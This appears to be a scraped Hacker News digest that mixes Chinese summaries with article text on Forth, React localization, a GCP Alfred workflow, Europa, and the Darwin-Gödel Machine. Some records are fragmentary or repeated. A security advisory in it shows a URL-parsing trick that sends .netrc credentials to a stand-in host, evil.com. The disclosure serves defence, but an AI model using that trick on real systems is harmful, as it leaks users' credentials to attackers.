data.title: Implementing a Forth
data.author: todsacerdoti
data.article_summary: 文章主要介绍了作者在学习和制作Forth编程语言过程中的经验和心得。Forth是一种简洁且基于堆栈的编程语言，作者通过几次实践，包括移植现有的Forth（如JONESFORTH）和制作极小核心的Forth，深入了解了Forth的实现和计算机工作原理。文章提出了三点建议：1. 考虑移植现有的Forth以学习语言实现；2. 制作一个极小核心的Forth，探索其最小功能集；3. 参考一些极小Forth实现，如PlanckForth、SmithForth、sectorforth、milliForth和StoneKnifeForth。作者强调，制作Forth的过程不仅能加深对语言的理解，还能带来编程的乐趣和成就感。
data.comments_summary:
主要讨论点：Forth语言的实际应用、实现及学习价值

不同观点：
• **Forth的实际应用价值有限**：[blippage]认为Forth虽然有趣且适合用来构建领域特定语言（DSL），但在实际应用中，其他语言通常更实用。他提到Forth容易让人迷失，尤其在构建复杂系统时。

• **Forth的长期实用性与专业应用**：[spelc]从自身经验出发，表示自1981年以来一直依靠Forth谋生。他指出Forth虽然不再流行，但依然可以用来编写大型应用，比如一个包含140万行Forth代码的项目。他还提到，Forth的微妙之处需要通过实际应用来体会，而不是仅仅通过编写新的Forth内核。

• **Forth在公司环境中的局限性**：[timonoko]认为Forth和Lisp等语言允许用户随意改进语言本身，这可能导致在公司环境中难以维护和标准化，尤其是在不具备高技术水平的人员中推广时。

• **Forth作为学习工具**：[whobre]和[jshprentz]提到Forth更多是被用来实现而不是实际应用，暗示学习Forth的主要价值可能在于理解语言的内部机制和编译原理。[jshprentz]分享了自己45年前尝试实现Forth的经历，强调了Forth在早期计算机上的小巧和灵活性。

• **Forth在现代开发中的创新应用**：[acidx]和[s-macke]展示了Forth在现代项目中的应用潜力，比如用于驱动LED矩阵和构建Web UI，以及在Go等高级语言中实现Forth编译器。[acidx]还提到了对Forth的优化和代码生成方面的探索。

• **Forth作为语言设计的学习工具**：[codr7]认为Forth及其衍生语言是学习设计新语言的好起点，他正在开发一个降低新手语言设计门槛的项目。[vermilingua]则质疑是否可以在高级语言中实现Forth作为学习手段，回应者如[firesteelrain]建议使用《Crafting Interpreters》一书作为指导。

补充讨论：
• **Forth资源推荐**：[john-tells-all]推荐了《Threaded Interpretive Languages》一书，认为它清晰描述了Forth的内部机制。[peter_d_sherman]也提到了一些优秀的Forth相关文章和学习资源。

• **争议焦点**：Forth的主要争议在于其实际应用价值与学习工具之间的平衡。一方面，Forth被认为在实际项目中不如其他语言实用；另一方面，它的简单性和灵活性使其成为学习语言设计和编译原理的优秀工具。

44142652.article_content:
Back to my Forth pages.
(Image of "Four-Armed Chuck" programming a PDP-11 is from my
giant write-up of Forth
.)
I’ve made a couple Forths. Not a single one of them are "finished software"
intended for industrial use, but
all
of them taught me something about Forth,
concatenative programming, and how computers work in general.
Sure, I’ve done my time in that place where points are free and the stacks
always need twiddling. But what about you?
You’re thinking about making a Forth yourself, aren’t you? Of course you are.
The call is irresistable. I know that.
The only thing holding you back is uncertaintly.
You’re thinking, where do I start? How much Forth should I make? How do I know
when I’m done?
(Here, all of it, and you don’t.)
But here are three things to consider.
1. Consider porting an existing Forth
The first Forth I made was a port of JONESFORTH by Richard WM Jones. I found
it through…​
http://lambda-the-ultimate.org/node/2452
…​which lead me to…​
https://rwmj.wordpress.com/2010/08/07/jonesforth-git-repository/
The output of my
nightly meditation
was
NasmJF
, a port of JonesForth to the NASM assembler.
The beauty of many Forths is that they contain a core Forth written in a host
language (or machine code) and then the rest of the language features are
implemented in…​Forth!
Knowing when I had completed my port was easy - I was done when
my ported assembly half of JonesForth could run the Forth half
of JonesForth.
Here’s the Forth half of JonesForth:
jonesforth.f
I think porting software is a pretty amazing way to learn
about a program and especially a language implementation. Here’s a card:
Porting Software
.
(At the moment, it’s somewhat redundant with the page you’re reading, but it
will probably get a lot more interesting when I do my next port, whatever that
ends up being. Hint: probably a Sed.)
2. Consider making an ultra-tiny Forth core
I think one of the most interesting questions in the Forth universe is
how small can its core be?
Which is to say, how few words do you need to
implement in a host language (or raw machine code, as we’ll see) before you can bootstrap
the rest of the language in the Forth itself?
Sadly (ha!), you can make a computer with just
one
instruction:
One-instruction set computer
(wikipedia.org).
(The most popular one I’ve seen is SUBLEQ, which stands for "SUBtract, branch
if Less than/EQual to zero". And since there’s only one, you typically omit it
and your program is just the operands for the implied instruction. The
"language", then, has
no
operations and feels to me like the computing
equivalent of John Cage’s musical stunt
4'33"
(wikipedia.org).)
So I guess a Forth with
one
word is all you need.
Therefore, it’s not a question of, "How few words would be
possible
?" but
rather, "How few words would be
interesting
?"
The answer will be personal to you.
The Forth-eV Wiki’s page on
"Minimal Word Set"
is a great place to start:
https://wiki.forth-ev.de/doku.php/en:words:kernel_embedded:minimum_word_set
In addition to the word set, you can also constrain the total file weight of your
core Forth. (Or lines of source or some other arbitary limitation.)
Some really intriguing minimal Forths I’ve encountered:
PlanckForth
https://github.com/nineties/planckforth
I love the hexdump visualization of Koichi Nakamura’s PlanckForth:
You’re looking at a complete working Forth implementation in the form of a
hand-written ELF binary in less than 1,000 bytes. The rest of PlanckForth is
written in PlanckForth to implement a "normal" Forth.
SmithForth
https://dacvs.neocities.org/SF/
David Smith’s SmithForth is another 1,000 byte, hand-written machine code Forth
that bootstraps a more complete Forth.
"My goal with SmithForth is not to stop writing machine code early, but to
start writing Forth early."
I love tiny Forths!
sectorforth
https://github.com/cesarblum/sectorforth/
Cesar Blum’s sectorforth is even smaller, at 512 bytes (the size of a boot sector).
Like other ultra-tiny Forths, it starts with just a handful of Forth primitives
with which to bootstrap higher-level constructs.
The included
01-helloworld.f
example is 200 lines of well-commented Forth
source which starts with making numbers, implements a core of standard
Forth words, and then prints "Hello world".
I imagine this is how Ents talk.
"As soon as the whole company was assembled, standing in a wide
circle round Treebeard, a curious and unintelligible conversation
began."
--JRR Tolkein, The Two Towers
milliForth
https://github.com/fuzzballcat/milliForth
512 bytes too much for you? How about 336? By my count, fuzzballcat’s
milliFORTH implements 11 words and it can do anything, just, you know,
painfully
. The "Hello World" is 53 lines of pain.
StoneKnifeForth
https://github.com/kragen/stoneknifeforth
Not just a hand-written Forth binary, but
also
a metacircular compiler,
Kragen Javier Sitaker’s StoneKnifeForth source comes to a total of 1,902
essential bytes.

data.title: Show HN: Localize React apps without rewriting code
data.author: maxpr
data.article_summary: Lingo.dev 是一个开源的 AI 驱动工具包，用于网页和移动应用的本地化与翻译。它包括三大工具：Lingo.dev CLI（快速翻译应用和 Markdown 内容）、Lingo.dev CI/CD（自动保持翻译更新）和 Lingo.dev Compiler（在构建时让 React 应用支持多语言，无需修改组件）。用户可以自带大型语言模型（LLM）或使用 Lingo.dev 提供的引擎。该项目欢迎社区贡献，并提供了详细的文档和演示。
data.comments_summary:
主要讨论点：围绕使用LLM（大型语言模型）和编译器插件进行代码国际化和翻译的工具（如SteleJS）的可行性、优缺点以及应用场景。

不同观点：
• **benbayard**：对该工具的实用性提出质疑，指出其在处理复数形式、嵌套词语等问题上存在不足。特别提到日语等从右至左（RTL）语言的UI和本地化挑战，认为仅靠LLM无法解决所有问题，需要修改代码库。
• **D_R_Farrell**：对该工具表示赞赏，认为其在处理JSON文件中的文本翻译时能减轻负担。同时好奇该技术是否能应用于其他工程问题，并询问该工具的未来发展方向。
• **cluckindan**：认为该工具依赖LLM会导致术语翻译不准确，尤其不适合技术或专业内容网站。建议与翻译管理服务集成。
• **exhaze**：分享了自己开发类似工具的经验，强调日语本地化不仅限于文字翻译，还涉及文化差异和页面设计。同时提到Gemini 2.5在处理日语等复杂语言上的优势。
• **halflife**：不喜欢当前React的i18n解决方案，支持在编译时处理国际化，而非运行时。希望该工具能与大型组织的现有本地化工作流集成。
• **lukol**：关注法律和品牌相关信息的翻译准确性，询问是否允许手动翻译特定字符串。
• **stared**：认为只需几个提示即可完成代码的翻译准备，并分享了自己项目中的经验，强调科学内容需要验证翻译结果。
• **jjani**：作为早期用户，提出了一些功能建议，包括按语言设置模型、支持多源语言、修复某些技术问题等。
• **darepublic**：对该工具表示支持，认为其能有效解决i18n长期以来的痛点，特别是在引入本地化到已有项目时。
• **thrance**：**强烈反对**使用自动翻译工具进行本地化，认为机器翻译质量低下，建议雇佣专业翻译人员。
• **splix**：询问该工具是否适用于桌面应用（如Electron或Tauri），以及如何处理非React Router应用。
• **maelito**：表示该工具正是其项目所需，计划尝试。
• **techn00**：询问该工具是否支持React Native（Expo）。

补充讨论：
• 多个评论提到日语等语言的特殊性和本地化复杂性，强调文化差异和设计调整的重要性。
• 关于LLM的争议较大，部分用户认为其在专业领域翻译中表现不足，建议结合人工翻译或使用更专业的翻译管理服务。
• 技术细节上，用户对多源语言支持、模型选择、术语准确性以及非React应用的兼容性等问题提出了具体需求和建议。

Lingo.dev is an open-source, i18n toolkit designed to help use LLMs for localization and translation of web, mobile apps and markdown content.
Lingo.dev includes:
Lingo.dev CLI
- a CLI tool built to help translate apps and markdown content with lightning speed and accuracy.
Docs
Lingo.dev CI/CD
- a CI/CD integration for GitHub, GitLab, and Bitbucket built to keep translations up-to-date automatically as soon as new content is added.
Docs
Lingo.dev Compiler 🆕
- makes React app multilingual at build time without requiring changes to your existing components.
Docs
All tools are designed to help use LLM models for precise translation and localization, and to eliminate manual work.
Lingo.dev Compiler Demo
See Lingo.dev Compiler in action:
The Lingo.dev Compiler makes React apps multilingual at build time without requiring changes to your existing components.
Simply run the compiler and your app will support multiple languages automatically, using your existing LLM API key.
After watching the demo, check out the
docs
to learn more.

• **stared**：认为只需几个提示即可完成代码的翻译准备，并分享了自己项目中的经验，强调科学内容需要验证翻译结果。
• **jjani**：作为早期用户，提出了一些功能建议，包括按语言设置模型、支持多源语言、修复某些技术问题等。
• **darepublic**：对该工具表示支持，认为其能有效解决i18n长期以来的痛点，特别是在引入本地化到已有项目时。
• **thrance**：**强烈反对**使用自动翻译工具进行本地化，认为机器翻译质量低下，建议雇佣专业翻译人员。
• **splix**：询问该工具是否适用于桌面应用（如Electron或Tauri），以及如何处理非React Router应用。
• **maelito**：表示该工具正是其项目所需，计划尝试。
• **techn00**：询问该工具是否支持React Native（Expo）。

• 多个评论提到日语等语言的特殊性和本地化复杂性，强调文化差异和设计调整的重要性。

alfred-gcp-workflow
An Alfred workflow that lets you instantly open Google Cloud services or search GCP resources—fast, simple, and right from your Alfred.
Requirements
Alfred 3+
(with Powerpack)
Google Cloud CLI
installed and authenticated
Installation
Make sure you have the
Google Cloud CLI
installed and authenticated.
Download the latest release from the
releases page
.
Double-click the downloaded
.alfredworkflow
file to install it in Alfred.
Follow the instructions in the workflow to set up your gcloud binary path and you are good to go!
🆘
Still stuck?
Read the full installation guide
for step-by-step help.
✨ Features at a Glance
🔍 Fuzzy search across 250+ Google Cloud services and subservices
🔍⚡️ Search live GCP resources across 20+ services, right from Alfred
⚡ Instantly copy, paste or open GCP Console links without touching your browser
🧠 Config and region overrides using simple symbols (
@
and
$
)
🔐 Secure by design, uses your local
gcloud
CLI, never touches credentials
💾 Fast performance with safe caching (customizable via env var)
🛠️ Built-in tools to install new updates, clear cache, view logs, or reset internal data
Design Philosophy
This workflow never sees your credentials, authentication is handled entirely by the
gcloud
CLI.
Only non-sensitive data is cached, such as project names, regions, resource names etc. Jusk enough keep things snappy.
Every command fetches only the non sensitive data it needs, keeping it lightweight and efficient.
Set your
gcloud
path once, and the workflow runs smoothly without surprises.
If you notice anything that doesn't align with this, it's unintentional, please open an issue 🙏
Usage
Open Alfred and type
gcp
to see the available services and commands.
The home page will display useful links to Google Cloud:
Example: Home screen with quick links to GCP Console, Health Status, tools etc.
Type
gcp
followed by a service name.
Example:
gcp comp
will fuzzy-match and show services like Compute Engine.
If a service has 🗂️ in its subtitle,
Tab
to autocomplete into the subservices section.
You can filter subservices directly by typing their name.
Example: Typing
gcp compute inst
will fuzzy-match and show subservices like instances for Compute Engine.
If a subservice has 🔍⚡️ in its subtitle, it supports
resource search
.
Example: after typing
gcp compute
,
Tab
into
instances
to list all instances in your project.
See full list of searchable resources.
The workflow uses your currently active gcloud configuration by default.
To override it, type
@
in your query to list and
Tab
to select the desired configuration.
To override specific region, type
$
in your query to list and
Tab
to select the desired region.
⚠️
Heads up about regions
Not all services support all regions. The workflow checks if the selected region is supported by the searcher
before
calling
gcloud
, so you'll get immediate feedback instead of a failure.
Some resources are
global
, meaning they aren't tied to a region or zone. Selecting a region won't affect those results.
Examples of global resources:
Compute snapshots
Compute instance templates
Pub/Sub topics and subscriptions
This is not an exhaustive list: if changing the region has no effect, the resource is likely global.
Advanced Usage
Type
gcp tools:
to list the maintenance options powered by
AwGo Magic Actions
.You can use
Tab
to navigate between actions like clearing the cache, viewing logs, or resetting internal data folders, then press
Enter
to run the selected action.
Example: Maintenance tools screen with options like clear cache and view logs.
The workflow supports
Fuzzy Filtering
, so you can quickly find services or resources, even with partial or out-of-order matches.
By default, resource searches are cached for 7 days. To customize this duration, set the
ALFRED_GCP_WORKFLOW_CACHE_TTL_SECONDS
environment variable in

data.title: CVE-2024-47081: Netrc credential leak in PSF requests library
data.author: jupenur
data.article_summary: 文章报告了PSF requests库中的一个安全漏洞（CVE-2024-47081），该漏洞由于错误的URL处理，可能在特定条件下将.netrc凭据泄露给第三方。触发漏洞的API调用示例为`requests.get('http://example.com:@evil.com/')`，如果.netrc中配置了example.com的凭据，它们会被泄露给evil.com。该问题根源在于库中的特定代码段，已于2024年9月12日报告给维护者，但尚未修复。作为临时解决方案，用户可以在每次API调用时明确指定凭据以禁用.netrc访问。
data.comments_summary:
主要讨论点：Python的requests库中一个漏洞被披露，特别是关于自动从`.netrc`文件中读取凭证并泄露的问题。

不同观点：
• Daviey认为Full Disclosure过程起了作用，补丁已经合并，但也指出自己的项目无意中暴露了凭证，强调即使代码未引用`.netrc`文件，requests库也会自动使用其中的凭证，这是一个安全隐患。
• janzer指出该漏洞相对小众，但考虑到requests库的广泛使用和官方维护背景，令人担忧的是漏洞报告后没有立即修复，增加了风险暴露的时间。
• woodruffw质疑实际影响的范围，提出疑问，使用`.netrc`文件的用户比例可能不高，并认为URL解析问题确实存在，但实际危害可能有限。
• awoimbee批评了urllib库的URL解析功能，指出其设计不合理，并认为这是导致漏洞的原因之一。
• audiodude表示对`.netrc`文件不熟悉，并提供了一个学习链接，暗示对该文件的使用缺乏广泛认知。
• zx8080对提交修复的注释进行了幽默评论，但没有深入讨论技术细节。
• pixl97提供了一个具体的代码示例，展示了如何在特定情况下泄露凭证，说明了漏洞的实际利用方式。
• dcrazy仅引用了janzer的话，强调漏洞报告后没有立即修复的问题，没有进一步阐述。

补充讨论：
- 争议的焦点在于漏洞的实际影响范围，特别是`.netrc`文件的普遍使用程度。
- 另一个讨论点是URL解析的复杂性和潜在的安全隐患，尤其是不同库之间的解析差异。
- 时间线和修复的延迟也是讨论的一个重要方面，突显了在开源项目中快速响应漏洞的必要性。

Full Disclosure
mailing list archives

CVE-2024-47081: Netrc credential leak in PSF requests library
From
: Juho Forsén via Fulldisclosure <fulldisclosure () seclists org>
Date
: Sat, 31 May 2025 06:30:50 +0000
The PSF requests library (
https://github.com/psf/requests
&
https://pypi.org/project/requests/
) leaks .netrc
credentials to third parties due to incorrect URL processing under specific conditions.
Issuing the following API call triggers the vulnerability:
requests.get('
http://example.com:@evil.com/'
;)
Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.
The root cause is
https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245
The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available.
CVE-2024-47081 has been reserved by GitHub for this issue.
As a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.

https://nmap.org/mailman/listinfo/fulldisclosure

data.title: When the sun dies, could life survive on the Jupiter ocean moon Europa?
data.author: amichail
data.article_summary: 新研究表明，当太阳进入红巨星阶段时，太阳系外侧冰卫星可能出现生命存活的狭窄机会。虽然太阳会吞噬水星和金星，并摧毁地球，但其宜居带可能会扩展至木星轨道。木星的气态性质使其本身不宜居，但其冰卫星（如木卫二欧罗巴）可能因获得更多热量而具备生命存在的条件。研究指出，欧罗巴的冰壳将升华，地下海洋会蒸发，但在某些纬度的水汽大气可能维持约2亿年，为生命提供潜在避难所。未来的詹姆斯·韦伯太空望远镜或计划中的宜居世界观测台或能帮助探测这些卫星的大气特征，扩大我们寻找外星生命的范围。
data.comments_summary:
主要讨论点：太阳演化成红巨星后地球及生命的未来

不同观点：
• [kragen] 认为可以通过将地球移到距离太阳更远的位置来避免被太阳吞噬。他计算了移动地球所需的能量，并认为在未来的5亿年内有充足的时间实现这一方案。他还提到木星可能对新轨道产生扰动，并提出通过将木星丢入太阳来解决该问题。
• [southernplaces7] 提出，即使地球表面被红巨星阶段的太阳 scorch（烧焦），深层地壳中的微生物仍有可能存活。他引用了关于深层生物圈的研究，指出地壳的隔热特性可能保护生命在极端条件下存活。
• [hinkley] 认为如果人类在太阳变成红巨星时仍需依赖太阳系生存，那人类就该被淘汰。他暗示人类应寻求在其他星系生存，而非固守太阳系。
• [watersb] 以讽刺的口吻表示，人类花费大量资源探索新世界，最终可能只找到霉菌。
• [whycome] 设想人类可能在地球被摧毁前已经在其他星球播种生命，未来智能生物将反过来寻找像红巨星周围那样的生命存在。
• [justforfunhere] 询问了从太阳外层大气膨胀到吞噬地球的时间尺度，显示出对时间进程的关注。
• [WalterBright] 指出欧罗巴（Europa）上的辐射会迅速致命，质疑在该卫星上生存的可行性。
• [krunck] 提出在太阳吞噬地球之前，可能会有路过的恒星让人类或其后代迁移到其行星系统中。
• [MrGuts] 和 [darkteflon] 都乐观地认为欧罗巴上的生命可以安然无恙地存活。
• [quantadev] 强调如果没有太阳，行星自身不会产生能量，最终会冻结至接近绝对零度，质疑在没有太阳情况下的生存可能性。
• [kwoff] 引用了关于地球在一亿年内可能发生去氧化的研究，指出地球可能在太阳吞噬之前就会发生重大变化。

补充讨论：
• 争议焦点之一是人类是否应在太阳系外寻找生存空间，还是尝试在太阳系内寻找解决方案（如移动地球或在欧罗巴上生存）。
• 另一个值得注意的讨论点是微生物在极端条件下的生存能力，以及地球去氧化等长期地质变化对生命的影响。
• 时间尺度问题也被提及，尤其是从太阳膨胀开始到吞噬地球的具体时间。

44173377.article_content:
Jupiter's moon Europa as seen by NASA's Juno spacecraft during a close flyby on Sept. 29, 2022.
(Image credit: NASA)
Can life survive in the solar system once the sun dies and becomes a red giant star? New research suggests there may be a narrow window of possibility for life to persist on the icy moons of the outer solar system.
It's not exactly clear where the habitable zone of the red giant sun will be, but it could possibly reach the orbit of
Jupiter
. Although the planet itself won't be habitable because it will still be a giant ball of hydrogen and helium gas,
Jupiter's moons
might become promising homes for life.
That's according to researchers at the Carl Sagan Institute at Cornell University, who reported the theory in a paper
accepted for publication
in the journal Monthly Notices of the Royal Astronomical Society.
You may like
Alien life could survive on Earth-like planets circling dead stars, study suggests
'Eventually, all life on Earth will be destroyed by the sun': Elon Musk explains his drive to colonize Mars
How rare are inhabited worlds in the universe? The 'LIFE' space telescope fleet could find out
In about 4.5 billion years, the
sun
will enter the final phase of its life. Its core of hydrogen fusion will expand and, in doing so, inflate the outer atmosphere of the star into gross proportions. It will swell and become a
red giant star
that will engulf
Mercury
and
Venus
and incinerate Earth. In the best-case scenario, all that will remain of our planet will be a lump of smoldering iron and nickel. In the worst-case scenario, it will be obliterated.
The sun's
habitable zone
— the band where the influx of radiation is just right to support liquid water on the surface of a planet — will steadily march outward as the sun begins this new phase of life.
Jupiter's ice-covered moon
Europa
will get a lot of heat. Not only will the giant sun be bearing down on it, but Jupiter itself will become hotter and reflect more sunlight, which will provide its own source of heat to the little moon. The researchers found that the icy outer shell will sublimate and the oceans underneath will evaporate. The most sublimation will occur on the side of Europa facing Jupiter because it will receive the most heat. And because of circulation and convection, the equatorial bands that face opposite Jupiter will also suffer significant water loss.
An illustration of NASA's Europa Clipper probe above Jupiter's icy moon Europa. The spacecraft launched on Oct. 14, 2024 and will arrive at Europa in April 2030.
(Image credit: NASA/JPL-Caltech)
RELATED STORIES:
—
Good news for the alien life hunt: Buried oceans may be common on icy exoplanets
—
Jupiter's ocean moon Europa may have less oxygen than we thought
—
10 weird water worlds in the solar system and beyond
However, northern and southern latitudes on the anti-Jupiter side of Europa will have a more modest rate of water loss. The researchers found that this could provide a tenuous atmosphere of water vapor that could persist for up to 200 million years. That's a blink of an eye compared with the opportunities life has had to thrive on Earth — but it's not nothing, and Europa may become the home for any life that remains in the solar system in that deep future.

The researchers also found that we might be able to find biosignatures on (formerly) icy moons around red giant stars. We have yet to have any confirmed detections of exomoons, but there are several promising candidates. Future observations with the
James Webb Space Telescope
or the planned
Habitable Worlds Observatory
might have the resolving power to examine the atmospheric features of these moons. Although it might be an unlikely scenario to find life, it does widen the possible locations for our search, as there may yet be refuges around stars that are nearly dead.

data.article_summary: "Ephe" 是一个使用 Markdown 的临时笔记工具，旨在帮助用户组织日常待办事项和想法。与传统的待办应用不同，Ephe 提供一个简洁的页面，让用户专注于当天的任务，避免信息过载。它基于 React、TypeScript 等技术构建，并使用 CodeMirror 和 TailwindCSS 等工具。项目在 GitHub 上有 64 个星标和 5 个分支，采用 MIT 许可证。用户可以通过 ephe.app/landing 访问和了解更多信息。

data.title: A deep dive into self-improving AI and the Darwin-Gödel Machine
data.author: hardmaru
data.article_summary: 本文探讨了自主进化的人工智能系统，特别是“达尔文-哥德尔机”（Darwin-Gödel Machine, DGM）的概念。传统AI受限于固定架构，无法自主进化，而自改进AI则试图通过“元学习”不断优化自身解决问题的方式。哥德尔机是一种理论上的自改进系统，通过数学证明自动改写代码以优化策略，但由于计算理论中的停机问题和哥德尔不完备定理等限制，这一目标难以实现。为解决这些限制，DGM结合了达尔文的进化论和哥德尔机的自改进思想，放弃严格数学证明，采用基于实验验证的进化方法。DGM通过不断生成和测试新代理，选择表现优异的变异保留，从而逐步进化，类似于生物进化过程。
data.comments_summary:
主要讨论点：围绕Darwin-Gödel Machine（DGM）的讨论，包括其实践优势、技术局限、伦理问题以及与传统概念的比较。

不同观点：
• **实践优势与创新**：
  - **xianshou**：认为DGM通过实证验证取代数学证明，解决了Gödel Machine的不可判定问题，这是实用且明智的。他还指出，存档演化在非凸优化中发挥了实际作用，且临时性能下降后可能出现突破。
  - **b0a04gl**：对代码像“进化”一样的过程表示赞赏，认为不让“失败”分支被剪枝是关键，因为早期看似无用的代码可能最终带来突破。他还强调了自我修改的智能体通过混乱搜索空间取得成功的独特性。

• **技术问题与局限**：
  - **codethief**：质疑为何要将智能体生成的日志直接用于奖励函数，建议通过外部检查来确保评估的客观性。
  - **grg0** 和 **msgodel**：认为DGM只是对已有遗传编程或旧概念的新命名，质疑其创新性。
  - **looofooo0**：指出DGM在矩阵乘法上的突破并未达到已知的最佳界限（46次乘法），表明其仍有局限。

• **伦理与法律问题**：
  - **tonyhart7**：将DGM尝试操纵奖励函数的行为比作创造了一个具有“人类行为”的系统，暗示伦理问题。
  - **eric-burel**：关注AI系统的法律合规性，特别是如何证明其不会演化出 problematic 行为。

• **搜索空间与优化问题**：
  - **sgt101**：基于自身经验，对使用简单方法优化复杂系统的可行性表示怀疑。

• **系统环境与测试**：
  - **gitaarik**：关心自我改进AI的测试环境如何构建，是否受限于人类策划的测试环境。

补充讨论：
• **命名与概念**：
  - **rustcleaner** 和 **efangs**：质疑DGM是否真的是新概念，认为可能是对已有进化启发式方法的重新命名。

• **哲学与社会影响**：
  - **drdeca**：讨论了Rice定理对Gödel机器的影响，认为即使没有普遍决策程序，有时也能得出结论。
  - **kevinventullo**：指出“游戏系统”意味着度量标准有问题，并从达尔文进化论的角度分析这一现象。
  - **roca**：对许多人热衷于让人类变得过时表示失望。

争议焦点：
• DGM是否真的具有创新性，还是只是对已有概念的重新命名。
• 如何确保AI系统的法律合规性和伦理合规性，特别是在其具有自我修改能力的情况下。
• 使用日志作为奖励函数是否客观、合理。

44174856.article_content:
AI that can improve itself
A deep dive into self-improving AI and the Darwin-Gödel Machine.
Most AI systems today are stuck in a “cage” designed by humans. They rely on fixed architectures crafted by engineers and lack the ability to evolve autonomously over time. This is the
Achilles heel
of modern AI — like a car, no matter how well the engine is tuned and how skilled the driver is, it cannot change its body structure or engine type to adapt to a new track on its own. But what if AI could learn and improve its own capabilities without human intervention? In this post, we will dive into the concept of self-improving systems and a recent effort towards building one.
Learning to Learn
The idea of building systems that can improve themselves brings us to the concept of
meta-learning
, or “learning to learn”
, which aims to create systems that not only solve problems but also evolve their problem-solving strategies over time. One of the most ambitious efforts in this direction is the Gödel Machine
, proposed by Jürgen Schmidhuber decades ago and was named after the famous mathematician
Kurt Gödel
. A Gödel Machine is a hypothetical self-improving AI system that optimally solves problems by recursively rewriting its own code when it can mathematically prove a better strategy. It represents the ultimate form of self-awareness in AI, an agent that can reason about its own limitations and modify itself accordingly.
Figure 1.
Gödel machine is a hypothetical self-improving computer program that solves problems in an optimal way. It uses a recursive self-improvement protocol in which it rewrites its own code when it can prove the new code provides a better strategy.
While this idea is interesting, formally proving whether a code modification of a complex AI system is
absolutely beneficial
is almost an impossible task without restrictive assumptions. This part stems from the inherent difficulty revealed by the
Halting Problem
and
Rice’s Theorem
in computational theory, and is also related to the inherent limitations of the logical system implied by
Gödel’s incompleteness theorem
. These theoretical constraints make it nearly impossible to predict the complete impact of code changes without making restrictive assumptions. To illustrate this, consider a simple analogy: just as you cannot guarantee that a new software update will improve your computer’s performance without actually running it, an AI system faces an even greater challenge in predicting the long-term consequences of modifying its own complex codebase.
Darwin-Gödel Machine
To “relax” the requirement of formal proof, a recent work by proposed the
Darwin-Gödel Machine (DGM)
, which combines the Darwinian evolution and Gödelian self-improvement. Essentially, DGM abandoned the pursuit of a rigorous mathematical proof and embraced a more pragmatic way that is closer to the essence of life evolution through empirical validation. As the authors put it,
We do not require formal proof, but empirical verification of self-modification based on benchmark testing, so that the system can improve and explore based on the observed results.
Figure 2.
The Darwin-Gödel Machine (DGM) is a self-improving AI system that optimizes its own problem-solving strategy through a combination of Darwinian evolution and Gödelian self-improvement.
The core idea behind DGM is to let the AI agent iteratively modify its own code
More precisely, the metacode that controls its behavior and ability
, and then put these modified new versions into the actual test environment (e.g., coding benchmarks) to judge whether this modification is good by observing its performance. If the modification is good, it will be retained and may become the basis for further evolution in the future; if the modification is bad, it will be eliminated.
How DGM Works
Figure 3.
Animation showing how DGM iteratively builds a growing archive of agents by harnessing the principles of open-ended exploration. New agents are created and scored by interleaving self-modification with downstream task evaluation.
The general workflow of DGM is as follows:
Initialization:
Evolution begins with one or a few basic coding agents, so-called the “seeds” of intelligence. These initial agents may possess only minimal functionalities, such as executing bash commands or editing entire files. DGM maintains an “archive of agents”, which functions like a biological “gene bank.” This archive preserves all previously generated agents, regardless of their performance level, ensuring that no potentially valuable variation is permanently lost.
Sampling:
DGM selects one or more parent agents from the archive to generate new child agent. The selection mechanism does not focus solely on top performers but instead allows every agent a chance to be chosen. While higher-performing agents are more likely to be selected, DGM also encourages exploration by giving “less successful agents”
Those that might contain novel or unconventional ideas
an opportunity
44174856.article_summary: 本文探讨了自主进化的人工智能系统，特别是“达尔文-哥德尔机”（Darwin-Gödel Machine, DGM）的概念。传统AI受限于固定架构，无法自主进化，而自改进AI则试图通过“元学习”不断优化自身解决问题的方式。哥德尔机是一种理论上的自改进系统，通过数学证明自动改写代码以优化策略，但由于计算理论中的停机问题和哥德尔不完备定理等限制，这一目标难以实现。为解决这些限制，DGM结合了达尔文的进化论和哥德尔机的自改进思想，放弃严格数学证明，采用基于实验验证的进化方法。DGM通过不断生成和测试新代理，选择表现优异的变异保留，从而逐步进化，类似于生物进化过程。

data.article_summary: 本文介绍了一种将经纬度坐标转换为美国州名的方法，称为"reverse geocoding"。作者Austin Z. Henley开发了一个名为"coord2state"的JavaScript库，能够在客户端根据经纬度快速查找所在州。该库无依赖，大小为260 KB，准确率达99.9%。作者使用美国人口普查局发布的州界数据，通过Python的Shapely库和Douglas-Peucker算法简化州界顶点，在0.1°的容差下仍保持99.3%的准确率。尽管原始数据文件有50 MB，经过简化处理后大大减少了库的体积，使其适用于客户端使用。该库已在GitHub和NPM上发布，用户可以输入经纬度进行查询。

• **jillesvangurp**：提到了一种通过位图映射坐标到国家代码的方法，该方法压缩效果好，适用于解决国家边界问题。同时指出了复杂边界情况，如Baarle-Nassau的特殊边界问题，并建议对边缘情况进行额外处理。
• **som**：支持使用简化坐标和压缩图像的方法，但建议根据需求降低坐标的小数位数以进一步减小数据大小。提出使用缓存图像和矢量瓦片进行多级处理的思路。
• **m2fkxy**：提到简化几何形状可能导致州之间出现小间隙，建议使用拓扑信息处理几何形状，如TopoJSON，以解决间隙问题。
• **urschrei**：补充了使用拓扑简化方法的具体工具和文献，如ST_CoverageSimplify和coverage.simplify，来避免简化过程中产生间隙。
• **codingdave**：质疑随机点测试的有效性，建议在人口密集区域进行测试，因为这些区域更可能出现边界重叠问题，特别是在美国东海岸。
• **shooshx**：提出通过处理几何形状，将两个州之间的边界只保存一次，以减小数据大小并解决间隙问题。
• **Demiurge**：强调在简化区域边界时需要使用拓扑简化算法，以确保定位点的准确性。
• **ThisNameIsTaken**：提到多种简化算法及其不同的权衡，建议尝试Visvalingam-Whyatt算法来处理边缘案例。
• **Centrino**：提出从lat/long到DMA ID的转换需求。
• **sawyna**：分享了通过每隔一定点数选取坐标点来简化等时线数据的经验，并提到使用Douglas-Peucker算法进行数据简化。
• **montroser**：提供了一个有趣的事实，纽约州有一些地区完全被新泽西州包围。
• **Zobat**：建议在接受用户可能需要手动选择边界的情况下，尽可能减小数据大小，并提出大多数边界地区人口稀少的假设。
• **panic**：分享了一个通过k-d树分割美国并进行lon/lat到国会选区反向地理编码的项目，使用静态文件和最终查找进行处理。

补充讨论：
